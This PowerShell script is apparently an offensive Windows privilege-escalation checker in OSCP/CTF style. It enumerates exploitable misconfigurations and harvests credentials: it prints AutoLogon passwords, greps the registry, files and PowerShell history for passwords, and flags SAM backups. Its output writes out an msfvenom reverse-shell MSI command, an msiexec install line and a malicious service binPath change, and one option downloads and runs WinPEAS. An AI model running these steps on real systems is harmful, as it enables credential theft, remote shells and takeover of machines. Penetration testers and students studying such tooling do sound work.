<![CDATA[###########################################
# Windows Privilege Escalation Checker
# Based on OSCP/CTF methodology
###########################################

param(
    [switch]$Quick,
    [switch]$Full,
    [string]$Output = "",
    [switch]$WinPEAS,
    [switch]$Help
)

# Colors
function Write-Color {
    param(
        [string]$Text,
        [string]$Color = "White"
    )
    Write-Host $Text -ForegroundColor $Color
}

function Write-QuickWin {
    param([string]$Text)
    Write-Color "[!!! QUICK WIN !!!] $Text" "Red"
}

function Write-Interesting {
    param([string]$Text)
    Write-Color "[+] INTERESTING: $Text" "Yellow"
}

function Write-Info {
    param([string]$Text)
    Write-Color "[*] $Text" "Cyan"
}

function Write-Success {
    param([string]$Text)
    Write-Color "[+] $Text" "Green"
}

# Banner
function Show-Banner {
    Write-Color @"

╔═══════════════════════════════════════════════════════════╗
║   ____       _       _____            _____ _               ║
║  |  _ \ _ __(_)_   _| ____|___  ___  / ____| |__   ___  ___║
║  | |_) | '__| \ \ / /  _| / __|/ __|| |    | '_ \ / _ \/ __|
║  |  __/| |  | |\ V /| |___\__ \ (__ | |____| | | |  __/ (__ ║
║  |_|   |_|  |_| \_/ |_____|___/\___| \_____|_| |_|\___|\___|
║                                                             ║
║           Windows Privilege Escalation Checker             ║
╚═══════════════════════════════════════════════════════════╝

"@ "Magenta"
}

# Help
function Show-Help {
    Write-Host @"
Usage: .\privesc_windows.ps1 [OPTIONS]

OPTIONS:
    -Quick          Quick wins only (AlwaysInstallElevated, unquoted paths, etc.)
    -Full           Full enumeration (recommended)
    -Output <dir>   Output directory (default: .\privesc_results_*)
    -WinPEAS        Download and run WinPEAS
    -Help           Show this help message

MODES:
    Quick Mode:     Fast scan for common quick wins
    Full Mode:      Comprehensive enumeration (default)

EXAMPLES:
    .\privesc_windows.ps1 -Quick                    # Quick wins only
    .\privesc_windows.ps1 -Full                     # Full enumeration
    .\privesc_windows.ps1 -Full -WinPEAS            # Full enumeration + WinPEAS
    .\privesc_windows.ps1 -Quick -Output C:\Temp    # Quick scan with custom output

"@
    exit 0
}

if ($Help) {
    Show-Banner
    Show-Help
}

# Setup output directory
if ($Output -eq "") {
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $Output = ".\privesc_results_$timestamp"
}

if (!(Test-Path $Output)) {
    New-Item -ItemType Directory -Path $Output | Out-Null
}

$QuickWinsFile = Join-Path $Output "QUICK_WINS.txt"
$InterestingFile = Join-Path $Output "interesting_finds.txt"

Show-Banner
Write-Info "Output directory: $Output"
Write-Host ""

###########################################
# QUICK WINS CHECKS
###########################################

function Check-AlwaysInstallElevated {
    Write-Info "Checking AlwaysInstallElevated registry keys..."

    $hklm = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
    $hkcu = Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue

    if ($hklm.AlwaysInstallElevated -eq 1 -and $hkcu.AlwaysInstallElevated -eq 1) {
        $finding = "AlwaysInstallElevated is enabled! Can install MSI as SYSTEM."
        Write-QuickWin $finding
        Add-Content -Path $QuickWinsFile -Value "[QUICK WIN] $finding"
        Add-Content -Path $QuickWinsFile -Value "Exploit: Create malicious MSI with msfvenom"
        Add-Content -Path $QuickWinsFile -Value "  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o evil.msi"
        Add-Content -Path $QuickWinsFile -Value "  msiexec /quiet /qn /i C:\Temp\evil.msi`n"
        return $true
    }
    return $false
}

function Check-UnquotedServicePaths {
    Write-Info "Checking for unquoted service paths..."

    $unquoted = @()
    $services = Get-WmiObject -Class Win32_Service | Where-Object {
        $_.PathName -notmatch '^"' -and
        $_.PathName -match ' ' -and
        $_.PathName -notmatch 'C:\\Windows\\'
    }

    foreach ($service in $services) {
        $path = $service.PathName -replace '(.*\.exe).*', '$1'

        # Check if we can write to any part of the path
        $pathParts = $path.Split('\')
        for ($i = 1; $i -lt $pathParts.Length - 1; $i++) {
            $testPath = ($pathParts[0..$i] -join '\')

            try {
                $acl = Get-Acl $testPath -ErrorAction Stop
                $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
                $writable = $false

                foreach ($access in $acl.Access) {
                    if ($access.IdentityReference -eq $currentUser.Name -or
                        $access.IdentityReference -eq "BUILTIN\Users" -or
                        $access.IdentityReference -eq "Everyone") {
                        if ($access.FileSystemRights -match "Write|FullControl|Modify") {
                            $writable = $true
                            break
                        }
                    }
                }

                if ($writable) {
                    $finding = "Unquoted service path: $($service.Name) - $($service.PathName)"
                    Write-QuickWin $finding
                    Add-Content -Path $QuickWinsFile -Value "[QUICK WIN] $finding"
                    Add-Content -Path $QuickWinsFile -Value "  Writable path: $testPath"
                    Add-Content -Path $QuickWinsFile -Value "  StartMode: $($service.StartMode)"
                    Add-Content -Path $QuickWinsFile -Value "  State: $($service.State)`n"
                    $unquoted += $service
                    break
                }
            }
            catch {
                continue
            }
        }
    }

    if ($unquoted.Count -eq 0) {
        Write-Host "  No exploitable unquoted service paths found"
    }

    return $unquoted.Count -gt 0
}

function Check-WritableServiceBinaries {
    Write-Info "Checking for writable service binaries..."

    $writable = @()
    $services = Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -match '\.exe' }

    foreach ($service in $services) {
        $path = $service.PathName -replace '"', '' -replace '(.*\.exe).*', '$1'

        if (Test-Path $path) {
            try {
                $acl = Get-Acl $path -ErrorAction Stop
                $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()

                foreach ($access in $acl.Access) {
                    if ($access.IdentityReference -eq $currentUser.Name -or
                        $access.IdentityReference -eq "BUILTIN\Users" -or
                        $access.IdentityReference -eq "Everyone") {
                        if ($access.FileSystemRights -match "Write|FullControl|Modify") {
                            $finding = "Writable service binary: $($service.Name) - $path"
                            Write-QuickWin $finding
                            Add-Content -Path $QuickWinsFile -Value "[QUICK WIN] $finding"
                            Add-Content -Path $QuickWinsFile -Value "  StartMode: $($service.StartMode)"
                            Add-Content -Path $QuickWinsFile -Value "  State: $($service.State)"
                            Add-Content -Path $QuickWinsFile -Value "  Replace with malicious binary`n"
                            $writable += $service
                            break
                        }
                    }
                }
            }
            catch {
                continue
            }
        }
    }

    if ($writable.Count -eq 0) {
        Write-Host "  No writable service binaries found"
    }

    return $writable.Count -gt 0
}

function Check-ModifiableServices {
    Write-Info "Checking for modifiable service configurations..."

    $modifiable = @()

    try {
        $services = Get-Service | ForEach-Object {
            $serviceName = $_.Name
            $serviceRights = $null

            try {
                $sd = sc.exe sdshow $serviceName 2>$null
                if ($sd -match "Everyone" -or $sd -match "BUILTIN\\Users") {
                    $modifiable += $serviceName
                    $finding = "Modifiable service: $serviceName"
                    Write-QuickWin $finding
                    Add-Content -Path $QuickWinsFile -Value "[QUICK WIN] $finding"
                    Add-Content -Path $QuickWinsFile -Value "  Can modify service configuration"
                    Add-Content -Path $QuickWinsFile -Value "  Change binPath: sc config $serviceName binPath= 'C:\path\to\malicious.exe'`n"
                }
            }
            catch {
                continue
            }
        }
    }
    catch {
        Write-Host "  Error checking service permissions"
    }

    if ($modifiable.Count -eq 0) {
        Write-Host "  No modifiable services found"
    }

    return $modifiable.Count -gt 0
}

function Check-AutoLogonCredentials {
    Write-Info "Checking for AutoLogon credentials..."

    $found = $false

    $username = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -ErrorAction SilentlyContinue
    $password = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -ErrorAction SilentlyContinue

    if ($username -and $password) {
        $finding = "AutoLogon credentials found!"
        Write-QuickWin $finding
        Add-Content -Path $QuickWinsFile -Value "[QUICK WIN] $finding"
        Add-Content -Path $QuickWinsFile -Value "  Username: $($username.DefaultUserName)"
        Add-Content -Path $QuickWinsFile -Value "  Password: $($password.DefaultPassword)`n"
        $found = $true
    }

    if (!$found) {
        Write-Host "  No AutoLogon credentials found"
    }

    return $found
}

function Check-ScheduledTasksWritable {
    Write-Info "Checking for writable scheduled task binaries..."

    $writable = @()

    try {
        $tasks = Get-ScheduledTask | Where-Object { $_.State -ne "Disabled" }

        foreach ($task in $tasks) {
            $actions = $task.Actions
            foreach ($action in $actions) {
                if ($action.Execute) {
                    $exe = $action.Execute -replace '"', ''

                    if (Test-Path $exe) {
                        try {
                            $acl = Get-Acl $exe -ErrorAction Stop
                            $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()

                            foreach ($access in $acl.Access) {
                                if ($access.IdentityReference -match "Users|Everyone" -or
                                    $access.IdentityReference -eq $currentUser.Name) {
                                    if ($access.FileSystemRights -match "Write|FullControl|Modify") {
                                        $finding = "Writable scheduled task binary: $($task.TaskName) - $exe"
                                        Write-QuickWin $finding
                                        Add-Content -Path $QuickWinsFile -Value "[QUICK WIN] $finding"
                                        Add-Content -Path $QuickWinsFile -Value "  Task: $($task.TaskPath)$($task.TaskName)"
                                        Add-Content -Path $QuickWinsFile -Value "  State: $($task.State)`n"
                                        $writable += $task
                                        break
                                    }
                                }
                            }
                        }
                        catch {
                            continue
                        }
                    }
                }
            }
        }
    }
    catch {
        Write-Host "  Error checking scheduled tasks"
    }

    if ($writable.Count -eq 0) {
        Write-Host "  No writable scheduled task binaries found"
    }

    return $writable.Count -gt 0
}

function Check-TokenPrivileges {
    Write-Info "Checking current user privileges..."

    $dangerous = @("SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege", "SeDebugPrivilege",
                   "SeBackupPrivilege", "SeRestorePrivilege", "SeTakeOwnershipPrivilege",
                   "SeLoadDriverPrivilege", "SeTcbPrivilege")

    $found = $false
    whoami /priv | Out-File -FilePath (Join-Path $Output "privileges.txt")

    foreach ($priv in $dangerous) {
        $hasPriv = whoami /priv | Select-String $priv | Select-String "Enabled"

        if ($hasPriv) {
            $finding = "Dangerous privilege enabled: $priv"
            Write-QuickWin $finding
            Add-Content -Path $QuickWinsFile -Value "[QUICK WIN] $finding"

            switch ($priv) {
                "SeImpersonatePrivilege" {
                    Add-Content -Path $QuickWinsFile -Value "  Exploit: PrintSpoofer, RoguePotato, JuicyPotato"
                }
                "SeAssignPrimaryTokenPrivilege" {
                    Add-Content -Path $QuickWinsFile -Value "  Exploit: Same as SeImpersonatePrivilege"
                }
                "SeDebugPrivilege" {
                    Add-Content -Path $QuickWinsFile -Value "  Exploit: Process injection, dump LSASS"
                }
                "SeBackupPrivilege" {
                    Add-Content -Path $QuickWinsFile -Value "  Exploit: Read any file, dump SAM/SYSTEM"
                }
                "SeRestorePrivilege" {
                    Add-Content -Path $QuickWinsFile -Value "  Exploit: Write to any file, modify registry"
                }
                "SeTakeOwnershipPrivilege" {
                    Add-Content -Path $QuickWinsFile -Value "  Exploit: Take ownership of any file"
                }
            }
            Add-Content -Path $QuickWinsFile -Value ""
            $found = $true
        }
    }

    if (!$found) {
        Write-Host "  No dangerous privileges found"
    }

    return $found
}

###########################################
# FULL ENUMERATION
###########################################

function Get-SystemInfo {
    Write-Info "Gathering system information..."

    $sysinfo = @"
=== SYSTEM INFORMATION ===

Computer Name: $env:COMPUTERNAME
OS: $(Get-WmiObject -Class Win32_OperatingSystem | Select-Object -ExpandProperty Caption)
Version: $(Get-WmiObject -Class Win32_OperatingSystem | Select-Object -ExpandProperty Version)
Architecture: $env:PROCESSOR_ARCHITECTURE
Current User: $env:USERNAME
Domain: $env:USERDOMAIN
Hostname: $env:COMPUTERNAME

"@

    Add-Content -Path (Join-Path $Output "systeminfo.txt") -Value $sysinfo

    systeminfo | Out-File -FilePath (Join-Path $Output "systeminfo_full.txt")
}

function Get-UserInfo {
    Write-Info "Gathering user information..."

    whoami /all | Out-File -FilePath (Join-Path $Output "whoami.txt")

    net user | Out-File -FilePath (Join-Path $Output "users.txt")
    net localgroup administrators | Out-File -FilePath (Join-Path $Output "administrators.txt")

    # Check for other users
    Get-LocalUser | Out-File -FilePath (Join-Path $Output "localusers.txt")
}

function Get-NetworkInfo {
    Write-Info "Gathering network information..."

    ipconfig /all | Out-File -FilePath (Join-Path $Output "ipconfig.txt")
    route print | Out-File -FilePath (Join-Path $Output "routes.txt")
    netstat -ano | Out-File -FilePath (Join-Path $Output "netstat.txt")

    # ARP cache
    arp -a | Out-File -FilePath (Join-Path $Output "arp.txt")
}

function Get-InstalledSoftware {
    Write-Info "Enumerating installed software..."

    Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
        Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
        Out-File -FilePath (Join-Path $Output "installed_software.txt")

    # 32-bit software on 64-bit system
    if (Test-Path "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall") {
        Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
            Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
            Out-File -Append -FilePath (Join-Path $Output "installed_software.txt")
    }
}

function Check-Passwords {
    Write-Info "Searching for passwords in common locations..."

    $interesting = @()

    # Registry
    $regPaths = @(
        "HKCU:\Software\",
        "HKLM:\Software\"
    )

    # Search for password-related registry keys
    Write-Host "  Searching registry for passwords..."
    reg query HKLM /f password /t REG_SZ /s 2>$null | Out-File -FilePath (Join-Path $Output "registry_passwords.txt")
    reg query HKCU /f password /t REG_SZ /s 2>$null | Out-File -Append -FilePath (Join-Path $Output "registry_passwords.txt")

    # Common file locations
    $searchPaths = @(
        "$env:USERPROFILE\",
        "C:\inetpub\wwwroot\",
        "C:\xampp\",
        "C:\wamp\"
    )

    Write-Host "  Searching files for passwords..."
    foreach ($path in $searchPaths) {
        if (Test-Path $path) {
            Get-ChildItem -Path $path -Recurse -Include *.txt,*.xml,*.ini,*.config,*.conf -ErrorAction SilentlyContinue |
                Select-String -Pattern "password" -ErrorAction SilentlyContinue |
                Out-File -Append -FilePath (Join-Path $Output "file_passwords.txt")
        }
    }

    # PowerShell history
    $historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $historyPath) {
        Write-Interesting "PowerShell history file found"
        Copy-Item $historyPath (Join-Path $Output "powershell_history.txt")

        $passwordLines = Get-Content $historyPath | Select-String -Pattern "password|pwd|pass" -ErrorAction SilentlyContinue
        if ($passwordLines) {
            Add-Content -Path $InterestingFile -Value "`n[+] Passwords found in PowerShell history:"
            Add-Content -Path $InterestingFile -Value $passwordLines
        }
    }
}

function Check-InterestingFiles {
    Write-Info "Searching for interesting files..."

    $extensions = @("*.kdbx", "*.vmdk", "*.vhd", "*.config", "*.conf", "*.ini", "*.xml", "*.bat", "*.cmd", "*.vbs", "*.ps1")

    Get-ChildItem -Path C:\ -Recurse -Include $extensions -ErrorAction SilentlyContinue |
        Select-Object FullName, Length, LastWriteTime |
        Out-File -FilePath (Join-Path $Output "interesting_files.txt")

    # SAM/SYSTEM backups
    $backupPaths = @(
        "C:\Windows\repair\SAM",
        "C:\Windows\System32\config\RegBack\SAM",
        "C:\Windows\repair\SYSTEM",
        "C:\Windows\System32\config\RegBack\SYSTEM"
    )

    foreach ($path in $backupPaths) {
        if (Test-Path $path) {
            Write-QuickWin "SAM/SYSTEM backup found: $path"
            Add-Content -Path $QuickWinsFile -Value "[QUICK WIN] SAM/SYSTEM backup: $path`n"
        }
    }
}

function Check-StartupPrograms {
    Write-Info "Checking startup programs..."

    # Startup folder
    Get-ChildItem "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" -ErrorAction SilentlyContinue |
        Out-File -FilePath (Join-Path $Output "startup_programs.txt")

    Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" -ErrorAction SilentlyContinue |
        Out-File -Append -FilePath (Join-Path $Output "startup_programs.txt")

    # Registry Run keys
    Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -ErrorAction SilentlyContinue |
        Out-File -Append -FilePath (Join-Path $Output "startup_programs.txt")

    Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -ErrorAction SilentlyContinue |
        Out-File -Append -FilePath (Join-Path $Output "startup_programs.txt")
}

function Check-FirewallRules {
    Write-Info "Checking firewall configuration..."

    netsh advfirewall show allprofiles | Out-File -FilePath (Join-Path $Output "firewall.txt")
    netsh advfirewall firewall show rule name=all | Out-File -Append -FilePath (Join-Path $Output "firewall.txt")
}

function Check-DLLHijacking {
    Write-Info "Checking for potential DLL hijacking opportunities..."

    # Check PATH for writable directories
    $pathDirs = $env:PATH -split ';'
    $writable = @()

    foreach ($dir in $pathDirs) {
        if (Test-Path $dir) {
            try {
                $testFile = Join-Path $dir "test_write_$(Get-Random).tmp"
                [System.IO.File]::WriteAllText($testFile, "test")
                Remove-Item $testFile -Force
                $writable += $dir
                Write-Interesting "Writable directory in PATH: $dir"
                Add-Content -Path $InterestingFile -Value "[+] Writable PATH directory: $dir"
            }
            catch {
                continue
            }
        }
    }

    if ($writable.Count -gt 0) {
        Add-Content -Path $QuickWinsFile -Value "[POTENTIAL] DLL Hijacking via writable PATH directories`n"
    }
}

function Download-WinPEAS {
    Write-Info "Downloading WinPEAS..."

    $winpeasUrl = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe"
    $winpeasPath = Join-Path $Output "winPEAS.exe"

    try {
        Invoke-WebRequest -Uri $winpeasUrl -OutFile $winpeasPath -UseBasicParsing
        Write-Success "WinPEAS downloaded to: $winpeasPath"

        Write-Info "Running WinPEAS..."
        $winpeasOutput = Join-Path $Output "winpeas_output.txt"
        & $winpeasPath > $winpeasOutput 2>&1
        Write-Success "WinPEAS output saved to: $winpeasOutput"
    }
    catch {
        Write-Host "  Error downloading WinPEAS: $_" -ForegroundColor Red
    }
}

###########################################
# MAIN EXECUTION
###########################################

$quickWinsFound = $false

Write-Color "`n=== QUICK WINS CHECK ===" "Yellow"
Write-Host ""

$quickWinsFound = Check-AlwaysInstallElevated -or $quickWinsFound
$quickWinsFound = Check-UnquotedServicePaths -or $quickWinsFound
$quickWinsFound = Check-WritableServiceBinaries -or $quickWinsFound
$quickWinsFound = Check-ModifiableServices -or $quickWinsFound
$quickWinsFound = Check-AutoLogonCredentials -or $quickWinsFound
$quickWinsFound = Check-ScheduledTasksWritable -or $quickWinsFound
$quickWinsFound = Check-TokenPrivileges -or $quickWinsFound

if (!$Quick -or $Full) {
    Write-Color "`n=== FULL ENUMERATION ===" "Yellow"
    Write-Host ""

    Get-SystemInfo
    Get-UserInfo
    Get-NetworkInfo
    Get-InstalledSoftware
    Check-Passwords
    Check-InterestingFiles
    Check-StartupPrograms
    Check-FirewallRules
    Check-DLLHijacking
}

if ($WinPEAS) {
    Write-Color "`n=== WINPEAS ===" "Yellow"
    Write-Host ""
    Download-WinPEAS
}

# Generate summary
Write-Color "`n=== SUMMARY ===" "Yellow"
Write-Host ""

if ($quickWinsFound) {
    Write-Color "[!] Quick wins found! Check: $QuickWinsFile" "Red"
} else {
    Write-Host "No quick wins found. Review full enumeration results."
}

Write-Host ""
Write-Success "Results saved to: $Output"
Write-Host ""
Write-Host "Key files:"
Write-Host "  - QUICK_WINS.txt        : High priority findings"
Write-Host "  - interesting_finds.txt : Noteworthy items"
Write-Host "  - systeminfo.txt        : System information"
Write-Host "  - privileges.txt        : Current user privileges"
Write-Host ""
]]>